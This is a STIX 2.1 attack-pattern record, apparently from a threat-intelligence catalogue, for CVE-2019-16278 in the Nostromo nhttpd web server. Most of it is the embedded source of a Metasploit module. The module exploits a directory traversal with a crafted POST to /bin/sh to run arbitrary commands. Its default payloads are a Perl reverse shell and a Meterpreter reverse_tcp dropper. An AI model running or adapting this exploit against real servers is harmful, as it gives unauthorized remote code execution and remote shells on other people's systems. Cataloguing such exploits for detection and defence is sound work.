{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--6fab2f92-79c0-466d-b227-4fc7c187fc40",
    "created": "2024-08-14T17:11:19.469446Z",
    "modified": "2024-08-14T17:11:19.46945Z",
    "name": "Nostromo Directory Traversal Remote Command Execution",
    "description": " This module exploits a remote command execution vulnerability in Nostromo <= 1.9.6. This issue is caused by a directory traversal in the function `http_verify` in nostromo nhttpd allowing an attacker to achieve remote code execution via a crafted HTTP request. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/nostromo_code_exec.rb",
            "external_id": "nostromo_code_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2019-16278"
        },
        {
            "source_name": "reference",
            "url": "https://www.sudokaikan.com/2019/10/cve-2019-16278-unauthenticated-remote.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::CmdStager\n  include Msf::Exploit::Remote::HttpClient\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Nostromo Directory Traversal Remote Command Execution',\n      'Description'    => %q{\n          This module exploits a remote command execution vulnerability in\n        Nostromo <= 1.9.6. This issue is caused by a directory traversal\n        in the function `http_verify` in nostromo nhttpd allowing an attacker\n        to achieve remote code execution via a crafted HTTP request.\n      },\n      'Author'         =>\n        [\n          'Quentin Kaiser <kaiserquentin[at]gmail.com>', # metasploit module\n          'sp0re', # original public exploit\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2019-16278'],\n          [ 'URL', 'https://www.sudokaikan.com/2019/10/cve-2019-16278-unauthenticated-remote.html'],\n        ],\n      'Platform'      => ['linux', 'unix'], # OpenBSD, FreeBSD, NetBSD, and Linux\n      'Arch'  => [ARCH_CMD, ARCH_X86, ARCH_X64, ARCH_MIPSBE, ARCH_MIPSLE, ARCH_ARMLE, ARCH_AARCH64],\n      'Targets'        =>\n        [\n          ['Automatic (Unix In-Memory)',\n            {\n                'Platform' => 'unix',\n                'Arch'  => ARCH_CMD,\n                'Type'  => :unix_memory,\n                'DefaultOptions'  => {'PAYLOAD' => 'cmd/unix/reverse_perl'}\n            }\n          ],\n          ['Automatic (Linux Dropper)',\n            {\n                'Platform' => 'linux',\n                'Arch'  => [ARCH_X86, ARCH_X64, ARCH_MIPSBE, ARCH_MIPSLE, ARCH_ARMLE, ARCH_AARCH64],\n                'Type'  => :linux_dropper,\n                'DefaultOptions'  => {'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp'}\n            }\n          ]\n        ],\n      'DisclosureDate' => '2019-10-20',\n      'DefaultTarget' => 0,\n      'Notes'         => {\n        'Stability' => [CRASH_SAFE],\n        'Reliability' => [REPEATABLE_SESSION],\n        'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]\n      }\n    ))\n  end\n\n  def check\n    res = send_request_cgi({\n        'method'   => 'GET',\n        'uri'      => normalize_uri(target_uri.path),\n      }\n    )\n\n    unless res\n      vprint_error(\"Connection failed\")\n      return CheckCode::Unknown\n    end\n\n    if res.code == 200 and res.headers['Server'] =~ /nostromo [\\d.]{5}/\n      /nostromo (?<version>[\\d.]{5})/ =~ res.headers['Server']\n      if Rex::Version.new(version) <= Rex::Version.new('1.9.6')\n        return CheckCode::Appears\n      end\n    end\n\n    return CheckCode::Safe\n  end\n\n  def execute_command(cmd, opts = {})\n    send_request_cgi({\n      'method'  => 'POST',\n      'uri'     => normalize_uri(target_uri.path, '/.%0d./.%0d./.%0d./.%0d./bin/sh'),\n      'headers' => {'Content-Length:' => '1'},\n      'data'    => \"echo\\necho\\n#{cmd} 2>&1\"\n      }\n    )\n  end\n\n  def exploit\n    # These CheckCodes are allowed to pass automatically\n    checkcodes = [\n      CheckCode::Appears,\n      CheckCode::Vulnerable\n    ]\n\n    print_status(\"Configuring #{target.name} target\")\n\n    case target['Type']\n    when :unix_memory\n      print_status(\"Sending #{datastore['PAYLOAD']} command payload\")\n      vprint_status(\"Generated command payload: #{payload.encoded}\")\n\n      res = execute_command(payload.encoded)\n\n      if res && datastore['PAYLOAD'] == 'cmd/unix/generic'\n        print_warning('Dumping command output in full response body')\n\n        if res.body.empty?\n          print_error('Empty response body, no command output')\n          return\n        end\n\n        print_line(res.body)\n      end\n    when :linux_dropper\n      print_status(\"Sending #{datastore['PAYLOAD']} command stager\")\n      execute_cmdstager\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2019-10-20",
    "x_mitre_platforms": [
        "linux'"
    ]
}